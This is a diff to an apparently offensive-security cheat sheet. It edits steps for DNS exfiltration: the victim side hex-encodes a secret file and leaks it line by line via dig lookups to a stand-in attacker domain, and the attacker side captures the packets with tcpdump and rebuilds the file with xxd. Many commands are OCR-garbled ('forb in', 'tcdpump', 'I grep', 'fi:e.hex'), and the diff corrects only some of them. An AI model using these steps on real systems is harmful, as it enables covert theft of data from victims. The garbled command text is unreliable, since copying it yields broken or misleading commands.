@@ -97,13 +97,13 @@ sudo python -m pyftpdlib -p 21 -u user -P pass
 
 **On victim:**
 
-1. Hexcode the file to be transferred
+Hexcode the file to be transferred
 
 ```text
 xxd -p secret fi:e.hex
 ```
 
-1. Read in each line and do a D~S lookup
+Read in each line and do a DNS lookup
 
 ```text
 forb in 'cat fole.hex '; do dig $[b.shell.evilexample.com](http://b.shell.evilexample.com); done
@@ -111,13 +111,13 @@ forb in 'cat fole.hex '; do dig $[b.shell.evilexample.com](http://b.shell.evilex
 
 **On attacker:**
 
-1. Capture DNS exfil packets
+Capture DNS exfil packets
 
 ```text
 tcdpump -w /tmp/dns -sO port 53 and host [sjstem.example.com](http://sjstem.example.com)
 ```
 
-1. Cut the exfiled hex from the DNS packet
+Cut the exiled hex from the DNS packet
 
 ```text
 tcpdump -r dnsdemo -n I grep [shell.evilexample.com](http://shell.evilexample.com) I cut -f9 -d'
@@ -125,10 +125,10 @@ tcpdump -r dnsdemo -n I grep [shell.evilexample.com](http://shell.evilexample.co
 cut -fl -d'.' I uniq received. txt
 ```
 
-1. Reverse the hex encoding
+Reverse the hex encoding
 
 ```text
-xxd -r -p received~.txt kefS.pgp
+xxd -r -p received.txt kefS.pgp
 ```
 
 ## Transfer via TFTP
